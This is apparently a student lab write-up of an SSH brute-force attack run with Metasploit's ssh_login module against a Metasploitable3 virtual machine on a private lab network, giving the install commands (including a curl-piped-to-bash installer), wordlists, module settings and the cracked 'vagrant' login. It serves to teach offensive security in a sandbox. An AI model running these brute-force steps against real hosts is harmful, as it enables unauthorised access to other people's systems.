
# Task 1.1 – SSH Brute-force Using Metasploit

## Environment Setup
- **Victim VM**: Metasploitable3
- **Attacker VM**: Kali Linux
- **Target Service**: SSH
- **Target IP**: 192.168.56.6

## Steps Performed

### 1. Metasploit Framework Installation
1. **Updated System Packages:**
   ```bash
   sudo apt update && sudo apt upgrade -y
   ```

2. **Installed Metasploit Frameworkt:**
   ```bash
   curl https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate | bash
   ```

3. **Launched Metasploit Consolee:**
   ```bash
   sudo msfconsole
   ```

### 2. Verified SSH is running
The `service ssh status` command was used on the victim machine (**Metasploitable3-ub1404**) to confirm that the SSH service is active and listening for connections.
```bash
service ssh status
```
<img src="./screenshots/01_ssh_service_status.png" alt="User/Pass file created" width="600">

### 3. Created users and passwords files
```bash
nano users.txt
nano pass.txt
```
Files Content:
- users.txt: Shahad, Norah, vagrant, Jude, Jouri, Abood, Hamood, Noor, Rawan, Ali, Ooody
- pass.txt: Shahad, Norah, vagrant, Jude, Jouri, Abood, Hamood, Noor, Rawan, Ali, Ooody


<img src="./screenshots/02_user_pass_created.png" alt="User/Pass file created" width="600">




### 4. Launched Metasploit Framework
The `msfconsole` command was executed on the attacker machine (**Kali Linux**) to launch the Metasploit Framework and begin the exploitation process.
```bash
msfconsole
```
<img src="./screenshots/03_msfconsole.png" alt="User/Pass file created" width="600">

### 5. Searched for SSH modules
The `search ssh` command was used within Metasploit to display all available SSH-related modules, including scanners and exploits.
```bash
search ssh
```
<img src="./screenshots/04_search_ssh.png" alt="User/Pass file created" width="600">

### 6. Selected ssh_login module
The `ssh_login` module (`auxiliary/scanner/ssh/ssh_login`) was selected to perform a brute-force attack using username and password combinations. The `show options` command was used to review configurable parameters for the module.
```bash
use 0 
show options
```
<img src="./screenshots/05_ssh_login_config.png" alt="User/Pass file created" width="600">

### 7. Configured and ran brute-force attack
The ssh_login module was configured using the users and passwords files along with the target IP address. The brute-force attack was then initiated using the `run` command to attempt SSH login with various credentials on the Metasploitable3 machine.
```bash
set USER_FILE users.txt
set PASS_FILE pass.txt
set RHOSTS 192.168.56.6
run
```
<img src="./screenshots/06_bruteforce_attempt.png" alt="User/Pass file created" width="600">

### Result:
Valid credentials found:
```
Success: 'vagrant':'vagrant'
Session 1 opened
```
<img src="./screenshots/07_successful_login.png" alt="User/Pass file created" width="600">
